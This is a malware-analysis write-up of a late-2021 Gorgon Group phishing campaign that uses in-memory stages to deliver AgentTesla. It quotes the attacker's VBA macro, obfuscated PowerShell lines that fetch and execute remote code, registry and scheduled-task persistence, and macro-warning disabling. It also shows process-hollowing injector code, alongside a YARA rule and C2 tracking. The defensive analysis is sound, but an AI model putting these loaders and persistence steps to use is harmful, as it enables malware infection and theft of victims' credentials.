This article unveils the last 2021 Gorgon Group campaign, including the technical details
regarding the infection chain and the various multi-stage payloads, its C&C architecture, a
tracking of the infected computer across the study, and finally, a way to automate the tracking
of the campaign and the payload extraction.
All of the IOCs are available here.

TL;DR
This late 2021 campaign leverage an in-memory-infection chain to drop the AgentTesla
malware on the infected computer, initiated by some phishing emails.
The infection chain uses a modular architecture, based on legit online services
(“blogspot.com” pages and “usrfiles.com”) that respectively serves some JS/PowerShell
command and a process hollowing tool.
A final AgentTesla v3 payload is then injected in the memory of a legitilimate process on the
infected computer.
At least half of the infected computer are Indonesian or related to the Indonesian industry.
Through a misconfiguration on the C&C servers, we can observe the evolution of the “botnet”
and track the infected computers.
A lot of them are in critical company, related to various areas:

The whole infection chain can be summarized by this diagram:

Each steps of the infection chain will be described in the following chapters.

Stage 0 : Downloader Macro
From the batch of analyzed phishing e-mails from this campaign, it seems that the most of
them are leveraging the auto_open() VBA function to execute some arbitrary code when
they are opened with the macro enabled.
The VBA script in the malicious macro is not sophisticated nor obfuscated. Its goal is to load
a remote JavaScript snippet through the “Mshta.exe” legitimate binary.
Here is an example of such a VBA macro that can be found in this campaign:

3/21

Enum myenum
myname1 = 1
myname2 = 2
myname3 = 3
myname4 = 4
End Enum
Public Function getEnumName(eValue As myenum)
Select Case eValue
Case 1
getEnumName = "mshta"
Case 2
getEnumName = "http://www.bitly.com/doaksodksueasdweu"
End Select
End Function
Public Function calc()
Set calc = GetObject(StrReverse("000045355444-E94A-EC11-972C-02690731:wen"))
End Function
Sub auto_open()
Dim Total As New clean
Dim NamakTotal, lora As String
NamakTotal = Total.getEnumName(1)
lora = Total.getEnumName(2)
koko = lora
Total. calc. ShellExecute NamakTotal, koko
End Sub

The reduced “bitly.com” link points to a blogspot page made by the attacker, which looks
empty at first glance:

Stage 1 : JS / Powershell Downloader

4/21

By taking a deeper look at the JavaScript embedded in the blogspot page, we can spot the
fact that this page contains a script that is supposed to be ran remotely by the mshta
instance from the previous stage.
Depending on the analyzed page, or even on the timing when this operation was monitored,
the scripts embedded in the various webpages may change.
This allows the operator to update the victims without the need to re-infect them or the recompile its payloads.
A total of 97 malicious active blogpost pages were identified and dumped. These pages do
not always share the same scripts. This repository contains a copy of the dumps made
during the monitoring of this campaign.
For instance, some scripts were very small and straight forward in order to load the next
stage without doing much more.
Some other were adding an intermediary persistence mechanism. For instance, this variant
is adding an entry in the “Run” registry key to make this stage 1 payload survive a reboot:
pink = "pOwersHelL.exe -w h i'E'x(iwr('<url>') -useB);i'E'x(iwr(<url>') useB);i'E'x(iwr('<url>') -useB);"
Const tpok = &H80000001
lopaskkk = "."
Set kasodkmwm = GetObject("winmgmts:\\" & lopaskkk & "\root\default:StdRegProv")
poloaosd = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
akosdwdjdw = "care"
kasodkmwm.SetStringValue tpok, poloaosd, akosdwdjdw, pink

In the same fashion, this other one is setting up a scheduled tasked:
function MainAccess1()
Megacall "schtas", "k" , "s /crea","te /sc MINUTE /mo 80 /tn """"Bluefibonashi""""
/" , "F /tr """"\""""M" , "s" , "H" , "t" , "A""""\""""<url>"""""
End function

Some others versions of these scripts were spotted cleaning the stage 0 parents process
and disabling the macro warning messages:

5/21

MicrosoftWINdows.Run "taskkill /f /im winword.exe", 0
MicrosoftWINdows.Run "taskkill /f /im Excel.exe", 0
MicrosoftWINdows.RegWrite
"HKCU\Software\Microsoft\Office\11.0\Word\Security\VBAWarnings", 1, "REG_DWORD"
MicrosoftWINdows.RegWrite
"HKCU\Software\Microsoft\Office\12.0\Word\Security\VBAWarnings", 1, "REG_DWORD"
MicrosoftWINdows.RegWrite
"HKCU\Software\Microsoft\Office\14.0\Word\Security\VBAWarnings", 1, "REG_DWORD"
MicrosoftWINdows.RegWrite
"HKCU\Software\Microsoft\Office\15.0\Word\Security\VBAWarnings", 1, "REG_DWORD"
MicrosoftWINdows.RegWrite
"HKCU\Software\Microsoft\Office\16.0\Word\Security\VBAWarnings", 1, "REG_DWORD"

This shows that the payloads are not homogeneous, even if they share the same objective:
loading the next stage from another remote website.
As for the previous snippets, the part where the next stage is loaded is an obfuscated
PowerShell command:
akosdwdjdw = "takeCare"
SubQueryPath akosdwdjdw,"pOweRshell.exe -w h I`E`X([System.IO.Strea"+"mReader]::new(
[System.Net.WebRequest]"+"::Create('https://92c49223-b37f-4157-904ddaf4679f14d5.usrfiles.com/ugd/92c492_974d936d2f6d4e52831d05712c24a1c9.txt').Ge"+"tResp
[Sy"+"stem.Net.WebRequest]::Cre"+"ate('https://92c49223-b37f-4157-904ddaf4679f14d5.usrfiles.com/ugd/92c492_fca89e4173af436497e274a5e70b6145.txt').GetRespons

This command gave us the next stage payload location : the “usrfiles.com” platform.
A list of the monitored “usrfiles.com” links can be found in the last part of this document.
A total of 101 malicious “usrfiles.com” pages were monitored for this analysis.
At this point of the infection, everything is fileless as the payloads are never written down to
the infected computer disk, making it harder for monitoring tools to detect the infection.

Stage 2 : Injector wrapper
Depending on the monitored blogpost / usrfiles endpoint, several payloads can be found.
They usually share the same goal: loading the next stage in memory using PowerShell.
Some lightweight PowerShell obfuscation methods are used.
For instance, in this first variant, the strings are built character by character and the injector
compiled binary + the final payload are respectively stored as a PowerShell byte array and a
compressed ZIP byte array:

6/21

[Byte[]] $ALOSH = @(31,139,8,0,0,0,0,0,4,0,237,189,7,96,28,73,150,37,38,47,109,202,
[...])
[...]
Byte[]] $Bytes = Decompress(@(31,139,8,0,0,0,0,0,4,0,204,189,9,152,92,69,181,56,126,
[...])
[...]
$nan = "R"+"e"+"g"+"A"+"s"+"m"+"."+"e"+"x"+"e"
[...]
[Object[]]
$Params=@($MyPt.Replace("F"+"r"+"a"+"m"+"e"+"w"+"or"+"k"+"6"+"4","F"+"r"+"a"+"mew"+"o"
,$Bytes)

Some versions are embedding the final payload as a non-compressed byte-array.
Another variant is compiling the target DLL (final stage) at runtime:
$CsharpCompiler = New-Object Microsoft.CSharp.CSharpCodeProvider($dictionary)
$CompilerParametres = New-Object System.CodeDom.Compiler.CompilerParameters
$v1 = "Sys@@@".Replace("@@@","tem.dll")
$CompilerParametres.ReferencedAssemblies.Add($v1)
$CompilerParametres.ReferencedAssemblies.Add("System.!@!$^^%^%**&*&*$$%$%$".Replace("!
$CompilerParametres.ReferencedAssemblies.Add("System.Windows.Forms.dll")
$CompilerParametres.ReferencedAssemblies.Add("mscorlib.dll")
$CompilerParametres.ReferencedAssemblies.Add("Microsoft.VisualBasic.dll")
$CompilerParametres.IncludeDebugInformation = $false
$CompilerParametres.GenerateExecutable = $false
$CompilerParametres.GenerateInMemory = $true
$CompilerParametres.CompilerOptions += "/platform:X86 /unsafe /target:library"

Finally, some variants are adding a quick persistence mechanism using the “Startup” folder
while doing some antivirus detection:
Move-Item -Path "C:\Users\Public\Micropoft.vbs" -Destination
"C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start
Menu\Programs\Startup\Micropoft.vbs" -Force -Verbose
[...]
if([System.IO.File]::Exists("C:\Program Files\ESET\ESET Security\ecmds.exe")){
[...]
}
elseif([System.IO.File]::Exists("C:\Program Files\Common
Files\McAfee\Platform\McUICnt.exe")){
[...]
}
elseif([System.IO.File]::Exists("C:\Program Files\Avast Software\Avast\AvastUI.exe"))
{
[...]
}

These injectors are signed by the “Alosh/3losh RAT” author.
#by code 3losh rat

Stage 3 : The Alosh/3losh Injector case
The next stage of the infection chain seems to leverage the same compiled injector file every
time, even if the injected content (the final payload) is not always the same.
A dozen of infection chain were related to the injector with the following hash:
404afe734de0bd19d2a25f85f28c860d

I’ve made a YARA rule to detect more of those injectors in the wild:
rule Alosh_Process_Hollowing_Mana_Campaign {
meta:
author = "HomardBoy"
description = "Alosh RAT process hollowing program linked to the 2021 Gorgon
Group APT"
strings:
$str1 = "alosh" ascii
$str2 = "projFUD" ascii
$str3 = "ZwUnmapViewOfSec" ascii
$str4 = "ResumeThread" ascii
$str5 = "WriteProcessMem" ascii
$str6 = "VirtualAll" ascii
$str7 = "CreateProc" ascii
condition:
(uint16(0) == 0x5a4d and all of ($str*))
}

This injector is not that new, and was already linked to previous Gorgon Group campaigns
[5].
This tool is heavily advertised on social medias, along with some other packers/exploits. The
YouTube channel named “3loshrat” shows a demonstration of how to use the injector, and its
configurations options:

8/21

The attentive reader will notice the presence of the “jsc.exe” available target in this
screenshot, which is the same as the hardcoded injection target in the downloader wrapper
from the stage 2.
The injector is advertised on many social media by the “3loshRAT” account:

https://www[.]instagram.com/3losh.rat
https://website[.]informer.cosh-rat.com
https://twitter[.]com/ali_fares11
https://www[.]youtube.com/c/3loshrat/videos

Those social media accounts are advertising various “Alosh/3losh RAT” products, while the
YouTube channel provide some demonstration of the actual tools.
"crypter . powershell . vb . c# for sale all programs"

9/21

A GitHub account with the same name and the same profile picture can also be found:

Regarding the actual injector itself:
The original name of this compiled DLL is straight forward: “runpe.dll”.
This binary, which is written in .Net, is linked to the Alosh/3losh RAT product through its file
descriptions:
[assembly: AssemblyCopyright("Copyright © 2022")]
[assembly: AssemblyTitle("3lostrat")]
[...]
[assembly: AssemblyDescription("3lostrat")]
[assembly: AssemblyProduct("3lostrat")]
[assembly: AssemblyCompany("3lostrat")]

The author of this piece of code saw far ahead for the copyright date of this sample, which
indicate the fact that this injector is still in its early life.
The goal of the binary is to inject an arbitrary binary, using a process hollowing technique
(given by the second argument to the injector) in the process space named after the first
given argument.
Almost all the stage 2 wrapper scripts were using the hardcoded target process name
“C:\Windows\Microsoft.NET\Framework\v4.0.30319\jsc.exe” to inject the next stage in it.
This simple injector can be summarized to the following code:

10/21

[...]
alosh_rat.CreateProcessA(arg2_path, string.Empty, IntPtr.Zero, IntPtr.Zero, false,
134217732U, IntPtr.Zero, null, ref startupInformation, ref processInformation);
[...]
alosh_rat.ZwUnmapViewOfSection(alosh_rat.ZwUnmapViewOfSection,
processInformation.ProcessHandle, num11
[...]
alosh_rat.WriteProcessMemory(processInformation.ProcessHandle, num9 + num7,
arg1_buffer, array2.Length, ref num5);
[...]
losh_rat.ResumeThread(alosh_rat.ResumeThread, processInformation.ThreadHandle)]
[...]

This code, which follows the standard Process Hollowing technique, seems inspired from this
repository: “https://github.com/NYAN-x-CAT/CSharp-RunPE/blob/master/RunPE/RunPE.cs”
as it share a lot of similarities with the Alosh / 3losh version (minor the execution flow
scrambling using some basic opaque predicates).
The injected payload (which is the final one of the infection stage) is a customized
AgentTesla v3 malware.
Stage 3 : AgentTesla Final Payload
The final payload is a customized version of the AgentTesla malware. It will periodically make
some screenshots of the infected computer screen, act as a keylogger when receiving a
special order and steal the victim’s browser cookies and passwords.
The technical detailed analysis of this AgentTesla version is available here.

C2 Infrastructure
The login page of the command and controls servers is a really unique one:

11/21

This login page is almost the same as the legacy AgentTelsa one, with a custom background
and some reference to the “Mana” string.
This “Mana” strings, the logo and the custom background allows linking this panel to the
Gorgon Group APT [4], as they seem to keep this login page along campaigns [1].
Unit 42’s researchers linked this characteristic panel to the “Aggah” threat actor, which is
associated to the Gorgon Group APT.
The late 2019/early 2021 campaigns were leveraging the same panel, but with the label
“version 3”, and was attributed to the GorgonGroup/Hagga APT by various researcher [2] [3].
Each server hold a list of 30 panels on average. They all share the same URL format
between servers. The root directory is identified with a single letter: ‘/j’ or ‘/k’, for instance.
Then a unique identifier is used to separate each panels: ‘/j/p1a’, ‘/j/p2b’, ‘/j/p3c’, …

Almost of the monitored servers were misconfigured, resulting in an open-directory at the
web server’s root directory.
The “/files” directory is interesting, as it contains the stolen data from the victims.
With this access, it is possible to monitor the evolution of the number of victims in time:

12/21

As seen in the introduction, we can spot a lot of infected computers in some critical area.

This one seems related to the tracking of credit card delivery:

13/21

This one is an infected computer inside what seems to be a datacenter:

Here is a medical tracking system:

14/21

And here is another instance with a customs service platform related to the Indonesian
government:

Many more other sensitive companies were infected, in a lot of different area, along with
some personal computer of citizens all around the world.
Something odd is the fact that one of the hosted panel stores a lot of infected computers
from major Indonesian companies. From my observations, an average of 54% of the infected
computer are Indonesians or related to Indonesians companies.

Automation
In order to build some hunting rules for the newer AgentTesla payload used in this campaign,
a static configuration extractor was built in Python. It allows extracting the campaign ID of the
compiled final payload, and its gate URL.
This script is available at https://github.com/GuillaumeOrlando/Daily-MalwareAnalysis/tree/main/2021_11_12.
It allows tracking new panels with ease, or to map new samples with existing panels
endpoints:

In order to gain access to those payloads, 3 additional scripts were created to automate the
tracking of the movement of the actor.
The first one is used to extract the stage 1 payload (JavaScript payload) for a set of given
blogspot URL:

These blogspot URL can be retrieved with the help of this small VirusTotal graph that I
made):

With those extracted stage 1 and the “usrfiles” extracted URL, we can now obtain the “3losh
Injector” binary and the injected content with the help of another script that will simply
download the stage 2 and 3 payloads.
